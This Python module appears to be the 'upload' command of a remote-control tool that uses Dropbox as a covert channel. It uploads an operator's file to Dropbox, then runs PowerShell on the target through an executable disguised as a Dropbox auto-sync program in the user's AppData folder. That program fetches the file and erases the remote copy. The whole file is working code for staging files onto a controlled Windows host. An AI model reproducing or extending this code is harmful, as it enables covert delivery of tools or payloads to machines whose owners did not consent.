"""
Command upload
"""


import os
import time
import ntpath
from command.command import CommandBase
from logger.logger import Logger


class CommandUpload(CommandBase):
    def __init__(self):
        self._engine = None
        self._drive_client = None
        self._logger = None
        self._arguments = {}
        self._file_state = 0

    def get_name(self):
        return "upload"

    def get_arguments_names(self):
        return {"path": "Local file path"}

    def set_arguments(self, arguments):
        self._arguments = arguments

    def run(self, engine, client, logger):
        self._engine = engine
        self._drive_client = client
        self._logger = logger
        prefix = engine.get_path_prefix()
        lpath = self._arguments.get(0)
        if not lpath:
            logger.log_message("Local path not specified")
            return False
        name = ntpath.basename(lpath)
        rpath = prefix + "/" + name
        self._file_state = 1
        self._logger.log_message(f"Uploading file")
        self._drive_client.upload_file(lpath, rpath)
        time.sleep(3)
        script = f"$path=\"C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\MyDropbox\\DropboxAutoSync\\DropboxAutoSync.exe\";" \
                 f"& $path get \"{rpath}\" \"{name}\";" \
                 f"& $path rm \"{rpath}\";"
        engine.run_script(script)
        return True

    def stop(self):
        self._file_state = 0

    def process_output(self, output):
        return output

    def drive_changed(self):
        path_prefix = self._engine.get_path_prefix()
        lpath = self._arguments.get(0)
        name = ntpath.basename(lpath)
        file_list = self._drive_client.list_dir(path_prefix)
        if name in file_list:
            if self._file_state == 1:
                self._file_state = 2
        elif self._file_state == 2:
            self._logger.log_message(f"File uploaded")
            self._file_state = 0
